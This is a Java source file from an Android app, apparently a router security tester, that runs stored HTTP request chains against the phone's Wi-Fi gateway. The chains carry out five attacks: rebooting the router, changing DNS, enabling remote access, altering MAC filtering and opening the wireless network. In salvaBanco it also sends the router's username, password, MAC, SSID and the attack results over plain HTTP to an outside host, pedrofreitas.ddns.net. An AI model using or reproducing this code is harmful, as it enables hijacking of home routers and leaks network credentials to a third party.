package br.pedrofreitas.myroutertestapp.util;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.MalformedURLException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.commons.codec.binary.Base64;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.CookieStore;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.protocol.ClientContext;
import org.apache.http.cookie.Cookie;
import org.apache.http.impl.client.AbstractHttpClient;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.protocol.BasicHttpContext;
import org.apache.http.protocol.HttpContext;

import android.annotation.SuppressLint;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.util.Log;
import br.pedrofreitas.myroutertestapp.dao.AtaqueDao;
import br.pedrofreitas.myroutertestapp.dao.DadoDao;
import br.pedrofreitas.myroutertestapp.dao.ParamsDao;
import br.pedrofreitas.myroutertestapp.dao.ParamsProxDao;
import br.pedrofreitas.myroutertestapp.dao.PostGetDao;
import br.pedrofreitas.myroutertestapp.manager.Ataque;
import br.pedrofreitas.myroutertestapp.manager.Dado;
import br.pedrofreitas.myroutertestapp.manager.Params;
import br.pedrofreitas.myroutertestapp.manager.PostGet;

public class FinishAtaque extends AsyncTask<Void, String, Integer> {

	private Intent it;
	private Context mContext;
	private ProgressDialog mProgress;
	
	private long mIdDadoAtaque;
	
	private ArrayList<Ataque> mListAtaque;

	private boolean mAtacou;

	private int mCountTipoAtaques;
	private static final String[] ataques = {"reboot", "dns", "acesso", "filtromac", "abrirrede"};
			
	private String urlSalvaBanco;
	private String urlInsereDado = "http://pedrofreitas.ddns.net/insereinfo.php?";

	private CookieStore cookieStore;
	private List<Cookie> cookies;
	
	private HashMap<String, String> nameValueUrl;		//GET
	private HashMap<String, String> nameValueParam;		//POST
	
	
	public FinishAtaque(Context mContext, long mIdDadoAtaque, ArrayList<Ataque> mListAtaque, int mCountTipoAtaques, Intent it) {
		this.mContext = mContext;
		this.mIdDadoAtaque = mIdDadoAtaque;
		this.mListAtaque = mListAtaque;
		this.mCountTipoAtaques = mCountTipoAtaques;
		this.mAtacou = false;
		this.it = it;
	}

	@Override
	protected void onPreExecute() {
		super.onPreExecute();
		mProgress = new ProgressDialog(this.mContext);
		mProgress.setMessage("Testando...");
		mProgress.setIndeterminate(false);
		mProgress.setMax(100);
		mProgress.setCancelable(false);
		mProgress.show();	
	}
	
	@Override
	protected void onProgressUpdate(String... values) {
		mProgress.setMessage(values[0]);
	}

	@Override
	protected Integer doInBackground(Void... params) {
		android.os.Debug.waitForDebugger();	
		
		DadoDao mDadoDao = new DadoDao(mContext);
		Dado auxDado = mDadoDao.getDadoWithId(mIdDadoAtaque);		
		
		int mCountAtaques = 0;
				
		if(mListAtaque != null) {	
			
			while(mCountAtaques < mListAtaque.size()) {
				
				cookies = null;
							
				Ataque auxAtaque = mListAtaque.get(mCountAtaques);		
	
				PostGetDao mPostGetDao = new PostGetDao(mContext);
				List<PostGet> mListPostGet = mPostGetDao.getPostEGetWithIdAtaque(auxAtaque.getId());			
				
				Log.i("LISTA_POSTGET_" + mCountAtaques, "tamanho " + mListPostGet.size());
				
				int mCountPostGet = 0;	
				int mCountPostGetAux = 0;
				boolean erro = false;
				
				nameValueUrl = new HashMap<>();	
				nameValueParam = new HashMap<>();	
				
				while(mCountPostGet < mListPostGet.size() && !erro) {				
					
					Iterator iterator = mListPostGet.iterator();
					PostGet auxPostGet = null;
					while(iterator.hasNext()) {
						auxPostGet = (PostGet) iterator.next();
						if(auxPostGet.getOrdem() > mCountPostGet) break;
					}
					
					Log.i("POSTGET_" + mCountAtaques + "_" + mCountPostGet, auxPostGet.toString());
					
					String comando = auxPostGet.getComando();						
					//Se existirem parametros de uma requisicao passada que devem ser usados na requisicao atual
					if(comando != null) {					
						if(comando.contains("insereMAC")) {
							WifiManager manager = (WifiManager) mContext.getSystemService(Context.WIFI_SERVICE);
							WifiInfo info = manager.getConnectionInfo();
							String address = info.getMacAddress();

							Log.i("URL_PARAM_NAME_INSERT", "'MAC'");
							Log.i("URL_PARAM_VALUE_INSERT", "'" + address + "'");	
							
							comando = comando.replaceAll("insereMAC", address);				
						}	
						
						if(nameValueUrl != null) {
							if(!nameValueUrl.isEmpty()) {
								comando = buildUrl(comando, nameValueUrl);
							}							
						}					
					}					
					
					if(auxPostGet.getTipo().contains("get")) {
					
						HttpGet httpGet = new HttpGet("http://" + auxDado.getGateway() + comando);
						
						Log.i("URL_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques + "_" + mCountPostGet, "http://" + auxDado.getGateway() + comando);
						
						if(auxPostGet.getUsa_login() == 1) {
							byte[] encodedBytes = Base64.encodeBase64((auxDado.getUsuario() + ":" + auxDado.getSenha()).getBytes());
							String encoding = new String(encodedBytes);
							Log.i("ENCODING_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques, encoding + "(" + auxDado.getUsuario() + ":" + auxDado.getSenha() + ")");
							httpGet.setHeader("Authorization", "Basic " + encoding);
						}
						

						final HttpParams httpParams = new BasicHttpParams();
						HttpConnectionParams.setSoTimeout(httpParams, 80000);		//1m20s
						HttpConnectionParams.setConnectionTimeout(httpParams, 80000);		//1m20s
						
						HttpClient httpClient = new DefaultHttpClient(httpParams);
						HttpContext localContext = new BasicHttpContext();	
						HttpResponse httpResponse = null;
						try {							

							if(auxAtaque.getUsa_cookie() == 1) {
								if(cookies == null) {
//									httpResponse = httpClient.execute(httpGet);									
									cookieStore = ((AbstractHttpClient) httpClient).getCookieStore();
									cookies = cookieStore.getCookies();
									Log.i("COOKIE", "Salvo");	
									
									httpResponse = httpClient.execute(httpGet);									
								} else {
									for (Cookie cookie: cookies) {
										Log.i("COOKIE_VERSION", cookie.getVersion() + "");
										Log.i("COOKIE_NAME", cookie.getName());
										Log.i("COOKIE_VALUE", cookie.getValue());
										Log.i("COOKIE_DOMAIN", cookie.getDomain());
										Log.i("COOKIE_PATH", cookie.getPath());
										Log.i("COOKIE_EXPIRY", cookie.getExpiryDate() + "");	
									}
									localContext.setAttribute(ClientContext.COOKIE_STORE, cookieStore);
									httpResponse = httpClient.execute(httpGet, localContext);	
								}								
							} else {
								httpResponse = httpClient.execute(httpGet);								
							}			
							
							Log.i("RESPONSE_STATUS_" + mCountAtaques  + "_" + mCountPostGet, httpResponse.getStatusLine() + "");

							erro = true;							

							if(httpResponse.getStatusLine().getStatusCode() != HttpStatus.SC_UNAUTHORIZED) {			
							
								HttpEntity responseEntity = httpResponse.getEntity();
															
								InputStream content = (InputStream) responseEntity.getContent();
								BufferedReader in = new BufferedReader(new InputStreamReader(content));				
								String line;		
								
								ParamsProxDao mParamsProxDao = new ParamsProxDao(mContext);
								List<Params> mListParamsProx = mParamsProxDao.getParamsWithIdComando(auxPostGet.getId());	
																
								while((line = in.readLine()) != null) {
									Log.i("CONEXAO_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques + "_" + mCountPostGet, line);																
									
									if(line.contains(auxPostGet.getToken())) {
										erro = false;
										mCountPostGetAux = auxPostGet.getOrdem();
									}

									//Se parametros retornados no html precisarem ser salvos para serem usados em alguma requisicao futura
									if(mListParamsProx.size() > 0) {
										for(int i = 0; i < mListParamsProx.size(); i++) {
											String name = mListParamsProx.get(i).getNome();
											String value = mListParamsProx.get(i).getValor();
											
											Pattern pattern = Pattern.compile(value);
											Matcher matcher = pattern.matcher(line);
											
											value = null;
											while(matcher.find()) {
												value = matcher.group(1);
											}
											
											if(value != null) {
												nameValueUrl.put(name.trim(), value.trim());
												nameValueParam.put("insere" + name.trim(), value.trim());
											}
										}
									} 									
								}
								
								in.close();
								content.close();
								
								mCountPostGet = mCountPostGetAux;
							}
							
							if(erro) {
								mCountAtaques++;
							}					
							
						} catch (ClientProtocolException e) {
							Log.e("ERR_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques + "_" + mCountPostGet, "ClientProtocolException", e);
							erro = true;
							mCountAtaques++;
						} catch (IOException e) {
							Log.e("ERR_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques  + "_" + mCountPostGet, "IOException", e);
							erro = true;
							//Condicao por causa do ataque abrir rede da sagemcom F@ast 2704N
							if(auxPostGet.getOrdem() == mListPostGet.size() && auxPostGet.getComando().equals("/wancfg.cmd?action=refresh")) {
								mCountPostGet = auxPostGet.getOrdem();
							} else {
								mCountAtaques++;								
							}	
						} finally {
							httpClient.getConnectionManager().shutdown();
						}						
							
					} else {
						if(auxPostGet.getTipo().contains("post")) {	
							
							HttpPost httpPost = new HttpPost("http://" + auxDado.getGateway() + comando);
					
							Log.i("URL_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques + "_" + mCountPostGet, "http://" + auxDado.getGateway() + comando);
							
							//Usa o login no post para auteticacao
							if(auxPostGet.getUsa_login() == 2) {
								byte[] encodedBytes = Base64.encodeBase64((auxDado.getUsuario() + ":" + auxDado.getSenha()).getBytes());
								String encoding = new String(encodedBytes);
								Log.i("ENCODING_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques, encoding + "(" + auxDado.getUsuario() + ":" + auxDado.getSenha() + ")");
								httpPost.setHeader("Authorization", "Basic " + encoding);
							}
							
							ParamsDao mParamsDao = new ParamsDao(mContext);
							List<Params> mListParms = mParamsDao.getParamsWithIdComando(auxPostGet.getId());
							List<NameValuePair>	auxParams;							
							
							if(mListParms.size() > 0) {
								auxParams = new ArrayList<NameValuePair>(mListParms.size());
								for(int i = 0; i < mListParms.size(); i++) {
									String name = mListParms.get(i).getNome();
									String value = mListParms.get(i).getValor();
									
									if(auxPostGet.getUsa_login() == 1) {
										//O parametro e o usuario do login
										if(mListParms.get(i).getValor().contains("insereUsuario")) {
											value = auxDado.getUsuario();
										}
										
										//O parametro e a senha do login
										if(mListParms.get(i).getValor().contains("insereSenha")) {
											value = auxDado.getSenha();
										}
																				
									}
									
									//Parametros guardados em requisicao passada
									if(nameValueParam != null) {
										if(!nameValueParam.isEmpty()) {
											if(nameValueParam.get(value) != null) {
												value = (String) nameValueParam.get(value);
												nameValueParam.remove(value);	
											}						
										}
									}

									if(value.contains("insereMAC:")) {
										WifiManager manager = (WifiManager) mContext.getSystemService(Context.WIFI_SERVICE);
										WifiInfo info = manager.getConnectionInfo();
										String address = info.getMacAddress();
										address = address.replace(":", "");
										value = value.replaceAll("insereMAC:", address);
									} else {									
										if(value.contains("insereMAC")) {
											WifiManager manager = (WifiManager) mContext.getSystemService(Context.WIFI_SERVICE);
											WifiInfo info = manager.getConnectionInfo();
											String address = info.getMacAddress();
											value = value.replaceAll("insereMAC:", address);
										}
									}
									
									auxParams.add(new BasicNameValuePair(name, value));
									Log.i("PARAM_NAME_" + mCountAtaques + "_" + i , "'" + name + "'");
									Log.i("PARAM_VALUE_" + mCountAtaques + "_" + i , "'" + value + "'");
								}
								try {
									httpPost.setEntity(new UrlEncodedFormEntity(auxParams, "UTF-8"));							
								} catch(UnsupportedEncodingException e) {
									Log.e(ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques, "UnsupportedEncodingException", e);
								}						
							}
								
							
							final HttpParams httpParams = new BasicHttpParams();
							HttpConnectionParams.setSoTimeout(httpParams, 80000);		//1m20s
							HttpConnectionParams.setConnectionTimeout(httpParams, 80000);		//1m20s
							
							HttpClient httpClient = new DefaultHttpClient(httpParams);
							HttpContext localContext = new BasicHttpContext();							
							HttpResponse httpResponse = null;
							try {								
								
								if(auxAtaque.getUsa_cookie() == 1) {
									if(cookies == null) {							
//										httpResponse = httpClient.execute(httpPost);
										cookieStore = ((AbstractHttpClient) httpClient).getCookieStore();
										cookies = cookieStore.getCookies();										
										Log.i("COOKIE", "Salvo");
										
										httpResponse = httpClient.execute(httpPost);
									} else {
										for (Cookie cookie: cookies) {
											Log.i("COOKIE_VERSION", cookie.getVersion() + "");
											Log.i("COOKIE_NAME", cookie.getName());
											Log.i("COOKIE_VALUE", cookie.getValue());
											Log.i("COOKIE_DOMAIN", cookie.getDomain());
											Log.i("COOKIE_PATH", cookie.getPath());
											Log.i("COOKIE_EXPIRY", cookie.getExpiryDate() + "");						
										}	
										
										localContext.setAttribute(ClientContext.COOKIE_STORE, cookieStore);										
										httpResponse = httpClient.execute(httpPost, localContext);	
									}									
								} else {
									httpResponse = httpClient.execute(httpPost);
								}
								
								Log.i("RESPONSE_STATUS_" + mCountAtaques + "_" + mCountPostGet, httpResponse.getStatusLine() + "");
								
								erro = true;
								
								if(httpResponse.getStatusLine().getStatusCode() != HttpStatus.SC_UNAUTHORIZED) {									
									
									HttpEntity responseEntity = httpResponse.getEntity();
						
									InputStream content = (InputStream) responseEntity.getContent();
							        BufferedReader in = new BufferedReader(new InputStreamReader(content));
							        String line;
							        
							        ParamsProxDao mParamsProxDao = new ParamsProxDao(mContext);
							        List<Params> mListParamProx = mParamsProxDao.getParamsWithIdComando(auxPostGet.getId());	

							        while((line = in.readLine()) != null) {
										Log.i("CONEXAO_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques + "_" + mCountPostGet, line);		
										
										if(line.contains(auxPostGet.getToken())) {
											erro = false;
											mCountPostGetAux = auxPostGet.getOrdem();
										}	
										
										//Se parametros retornados no html precisarem ser salvos para serem usados em alguma requisicao futura
										if(mListParamProx.size() > 0) {
											for(int i = 0; i < mListParamProx.size(); i++) {
												String name = mListParamProx.get(i).getNome();
												String value = mListParamProx.get(i).getValor();
												
												Pattern pattern = Pattern.compile(value);
												Matcher matcher = pattern.matcher(line);
												
												value = null;
												while(matcher.find()) {
													value = matcher.group(1);
												}
												
												if(value != null) {
													nameValueUrl.put(name.trim(), value.trim());
													nameValueParam.put("insere" + name.trim(), value.trim());
												}
											}
										} 	
									}	
							        
							        in.close();
							        content.close();
							        
									mCountPostGet = mCountPostGetAux;								
								}	
								
								//Condicao criado pois apos o reboot no Sagemcom F@st2764 e retornado html vazio
								if(auxPostGet.getOrdem() == mListPostGet.size() && auxPostGet.getComando().equals("/index.cgi")) {
									erro = false;
									mCountPostGet = auxPostGet.getOrdem();
								}
								
						        if(erro) {
						        	mCountAtaques++;
								}
								
							} catch (ClientProtocolException e) {
								Log.e("ERR_" + ataques[mCountTipoAtaques].toUpperCase() +"_" + mCountAtaques  + "_" + mCountPostGet, "ClientProtocolException", e);
								erro = true;
								mCountAtaques++;
							} catch (IOException e) {
								Log.e("ERR_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques  + "_" + mCountPostGet, "IOException", e);
								erro = true;
								//Condicao por causa do ataque reboot e abrir rede da technicolor, abrir rede da zyXEL, e abrir rede sagemcom powerbox f@st2764
								if(auxPostGet.getOrdem() == mListPostGet.size() && (auxPostGet.getComando().equals("/reboot.cgi") || 
																					auxPostGet.getComando().equals("/wlwpa.cgi") ||
																					auxPostGet.getComando().equals("/cgi-bin/WLAN_General.asp") ||
																					(auxPostGet.getComando().equals("/index.cgi") && auxPostGet.getId_ataque() == 33))) {
									mCountPostGet = auxPostGet.getOrdem();
								} else {
									mCountAtaques++;								
								}							
							} finally {
								httpClient.getConnectionManager().shutdown();
							}						
							
						} else {
							Log.e("ERR_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques, "Comando HTTP nao identificado");
							mAtacou = false;
							break;						
						}
					}
				}	
				
				if(mCountPostGet >= mListPostGet.size()) {
					mAtacou = true;
					break;
				}
			}			
		} 
				
		return mCountAtaques;
	}
	
	@Override
	protected void onPostExecute(Integer result) {
		super.onPostExecute(result);
		int mCountAtaques = (int) result;	
		
		DadoDao mDadoDao = new DadoDao(mContext);
		Dado auxDado = mDadoDao.getDadoWithId(mIdDadoAtaque);					
		
		if(mAtacou) {		
			Log.i(ataques[mCountTipoAtaques].toUpperCase() + "_SUCESSO", mListAtaque.get(mCountAtaques).toString());	
			int id = (int) mListAtaque.get(mCountAtaques).getId();
			switch (ataques[mCountTipoAtaques]) {
				case "reboot":
					auxDado.setReboot_ataque(id);
					break;
				case "dns":
					auxDado.setDns_ataque(id);
					break;
				case "acesso":
					auxDado.setAcesso_remoto_ataque(id);
					break;					
				case "filtromac":
					auxDado.setFiltro_mac_ataque(id);
					break;
				case "abrirrede":
					auxDado.setAbrir_rede_ataque(id);
					break;
				default:
					Log.e("ERR_TIPO", "Tipo de ataque nao identificado");
					break;
			}
			mDadoDao.update(auxDado);
			
			Log.i("STATUS", "Ataque tipo '" + ataques[mCountTipoAtaques] + "' encerrado com sucesso");	
			try {
				Thread.sleep(150000);		//2m30s
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		} else {
			Log.i("STATUS", "Ataque tipo '" + ataques[mCountTipoAtaques] + "' encerrado sem sucesso");	
			try {
				Thread.sleep(20000);		//20s
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
		
		Log.i("DADO_TEMP", auxDado.toString());

		if(mCountTipoAtaques == ataques.length - 1) {
			if(!NetworkUtil.isWiFiConnected(mContext)) {
				reconecta(auxDado);			
			} 
			
			salvaBanco(auxDado);			
			mProgress.setMessage("Concluído");
			mProgress.dismiss();
			
			it.putExtra("Dado", auxDado);
			mContext.startActivity(it);
		} else {
			mCountTipoAtaques++;
			Log.i("STATUS", "Proximo ataque tipo '" + ataques[mCountTipoAtaques] + "' iniciando...");
			
			AtaqueDao mAtaqueDao = new AtaqueDao(mContext);		
			ArrayList<Ataque> mListAtaque = mAtaqueDao.getAtaquesWithOperadoraETipoEFabricanteModelo(null, ataques[mCountTipoAtaques], auxDado.getFabricante_modelo());
			
			if(mListAtaque != null) {
				Log.i("LISTA_" + ataques[mCountTipoAtaques].toUpperCase(), "tamanho " + mListAtaque.size());				
			} else {
				Log.i("LISTA_" + ataques[mCountTipoAtaques].toUpperCase(), "Lista vazia");
			}	
			
			
			new FinishAtaque(mContext, mIdDadoAtaque, mListAtaque, mCountTipoAtaques, it).execute();					
		}	
	}
	
	public boolean checkScanResults(Dado auxDado) {
		WifiManager wifiManager = (WifiManager) mContext.getSystemService(Context.WIFI_SERVICE);
		List<ScanResult> networkList = wifiManager.getScanResults();
		for(ScanResult network : networkList) {
			if(network.SSID.equals(auxDado.getSsid())) {				
				Log.i("SCAN", "SSID=" + network.SSID +
						"; BSSID=" + network.BSSID +
						"; capabilities=" + network.capabilities +
						"; level=" + network.level +
						"; frequency=" + network.frequency);
				return true;
			}
		}		
		return false;
	}
	
	@SuppressLint("NewApi") public int checkConfNetworks(Dado auxDado) {
		WifiManager wifiManager = (WifiManager) mContext.getSystemService(Context.WIFI_SERVICE);
		List<WifiConfiguration> networkListConf = wifiManager.getConfiguredNetworks();
		for(WifiConfiguration network : networkListConf) {
			if(network.SSID.equals(auxDado.getSsid())) {
				Log.i("CONF", "ID=" + network.networkId +
						"; SSID=" + network.SSID +
						"; BSSID=" + network.BSSID +
						"; FQDN=" + network.FQDN +
						"; PRIO=" + network.priority +
						"; KeyMgmt=" + network.allowedKeyManagement +
						"; Protocols=" + network.allowedProtocols +
						"; AuthAlgorithms=" + network.allowedAuthAlgorithms +
						"; PairwiseCiphers=" + network.allowedPairwiseCiphers +
						"; GroupCiphers=" + network.allowedGroupCiphers +
						"; WepKeys" + network.wepKeys +
						"; HiddenSSID" + network.hiddenSSID +
						"; WepTxKeyIndex" + network.wepTxKeyIndex +
						"; Status=" + network.status);
				return network.networkId;
			}
		}			
		return (int) -1;
	}	
	
	public void reconecta(Dado auxDado) {		
		String networkSSID = String.format("\"%s\"", auxDado.getSsid()); 	

		WifiConfiguration conf = new WifiConfiguration();
		conf.SSID = networkSSID;
		
		conf.allowedKeyManagement.clear();
		conf.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE);
		
		conf.allowedProtocols.clear();
		conf.allowedProtocols.set(WifiConfiguration.Protocol.RSN);
		conf.allowedProtocols.set(WifiConfiguration.Protocol.WPA);
		
		conf.allowedAuthAlgorithms.clear();
		conf.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.CCMP);
		conf.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.TKIP);
		conf.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.WEP40);
		conf.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.WEP104);
		conf.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.CCMP);
		conf.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.TKIP);		
		
		WifiManager wifiManager = (WifiManager) mContext.getSystemService(Context.WIFI_SERVICE);
		
		int networkId = checkConfNetworks(auxDado);
		if(networkId != -1) {
			wifiManager.removeNetwork(networkId);	
			wifiManager.saveConfiguration();
			Log.i("REMOVE_NET", "Removida rede " + networkSSID + " de id = " + networkId);
		}
		
		networkId = wifiManager.addNetwork(conf);
		if(networkId != -1) {
			wifiManager.enableNetwork(networkId, true);
			wifiManager.saveConfiguration();
				
			wifiManager.reconnect();
			
			Log.i("ADD_NET", "Removida rede " + networkSSID + " de id = " + networkId);
		} else {
			Log.e("ERR_ASSOCIATION", "Falha ao conectar a rede " + networkSSID);
		}		
	}

	public void salvaBanco(Dado auxDado) {				
		if(NetworkUtil.isWiFiConnected(mContext)) {
			try {
				urlSalvaBanco = urlInsereDado + "ip=" + auxDado.getIp() + "&gateway=" + auxDado.getGateway() + "&mac=" + auxDado.getMac() + "&ssid=" + auxDado.getSsid().replaceAll("\"", "") + "&operadora=" + auxDado.getOperadora() + 
						"&data=" + auxDado.getData().replace(" ", "_") + "&fabricante_modelo=" + auxDado.getFabricante_modelo().replace(" ", "_") + "&usuario=" + auxDado.getUsuario().replace(" ", "_") + "&senha=" + auxDado.getSenha().replace(" ", "_") +
						"&reboot_ataque=" + auxDado.getReboot_ataque() + "&dns_ataque=" + auxDado.getDns_ataque() + "&acesso_remoto_ataque=" + auxDado.getAcesso_remoto_ataque() +
						"&filtro_mac_ataque=" +	auxDado.getFiltro_mac_ataque() + "&abrir_rede_ataque=" + auxDado.getAbrir_rede_ataque();
				
				Log.i("URL_SALVA", urlSalvaBanco.toString());		
				
				HttpClient httpClient = new DefaultHttpClient();
				HttpGet httpGet = new HttpGet(urlSalvaBanco);
				
				HttpResponse httpResponse = httpClient.execute(httpGet);
				
				Log.i("RESPONSE_STATUS_SALVA", httpResponse.getStatusLine() + "");
				
				BufferedReader in = new BufferedReader(new InputStreamReader(httpResponse.getEntity().getContent()));
				String line;
				StringBuffer response = new StringBuffer();
				
				while((line = in.readLine()) != null) {
					response.append(line);
				}
				in.close();
				
				Log.i("CONEXAO_SALVA", response.toString());
				
			} catch (MalformedURLException e) {
				Log.e("ERR_SALVAR", "MalformedURLException", e);
			} catch (IOException e) {
				Log.e("ERR_SALVAR", "IOException", e);
			}			
			Log.i("DADO_SALVO", auxDado.toString());
		} else {
			Log.i("ERR_DADO_SALVO", "Nao foi possivel salvar o dado no ws por nao existir uma conexao wifi ativa");
		}
		
	}
		
	public String buildUrl(String url, HashMap nameValueUrl) {
		for(Object name: nameValueUrl.keySet()) {
			Log.i("URL_PARAM_NAME", "'" + name.toString() + "'");
			Log.i("URL_PARAM_VALUE", "'" + nameValueUrl.get(name).toString() + "'");
		}
		
		Iterator<Map.Entry<String, String>> iterator = nameValueUrl.entrySet().iterator();
		while(iterator.hasNext()) {
			Map.Entry<String, String> entry = iterator.next();
			if(url.contains("insere" + entry.getKey())) {
				Log.i("URL_PARAM_NAME_INSERT", "'" + entry.getKey() + "'");
				Log.i("URL_PARAM_VALUE_INSERT", "'" + entry.getValue() + "'");
				
				url = url.replaceAll("insere" + entry.getKey(), entry.getValue());	
				iterator.remove();	
			}
		}
				
		return url;
	}
		
}



